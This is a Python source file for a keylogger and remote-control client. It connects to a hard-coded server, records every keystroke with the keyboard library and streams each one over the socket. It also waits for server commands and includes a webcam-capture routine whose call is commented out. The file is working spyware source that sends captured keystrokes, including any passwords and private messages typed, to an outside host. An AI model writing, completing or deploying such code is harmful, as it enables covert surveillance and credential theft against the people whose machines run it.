import socket
import cv2
import threading
import keyboard
from threading import Timer
from datetime import datetime

SERVER_HOST = "192.168.0.8"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEND_REPORT_EVERY = 10  # in seconds

# Create the socket object.
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

#receiving commands
class Command:
    def __init__(self):
        self.command = None

    def receive(self):
        self.command = s.recv(BUFFER_SIZE).decode()
        return self.command

    def execute(self):
        print("Waiting for commands")
        while True:
            self.receive()
            if self.command == "screenshot":
                print("Taking screenshot")
                s.sendall("Screenshot taken".encode())
                # screenshot = Screenshot()
                # screenshot.start()

            elif self.command == "exit":
                s.close()
                break



class Screenshot:
    def __init__(self):
        self.screenshot = None

    def take_screenshot(self):
        self.screenshot = cv2.VideoCapture(0)
        ret, frame = self.screenshot.read()
        if ret:
            _, img_encoded = cv2.imencode(".jpg", frame)
            return img_encoded.tobytes()
        return None

    def start(self):
        screenshot = self.take_screenshot()
        if screenshot:
            s.sendall(screenshot)    

class Keylogger:
    def __init__(self, interval, server_socket, report_method="file"):
        self.interval = interval
        self.log = ""
        self.server_socket = server_socket

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        self.send_keypress(name)

    def send_keypress(self, keypress):
        try:
            self.server_socket.sendall(keypress.encode())
        except Exception as e:
            print(f"Error sending keypress: {e}")



    def start(self):
        keyboard.on_release(callback=self.callback)
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()



keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
keylogger_thread = threading.Thread(target=keylogger.start)
keylogger_thread.start()
# keylogger_thread.join()

command = Command()
command_thread = threading.Thread(target=command.execute)
command_thread.start()

# s.close()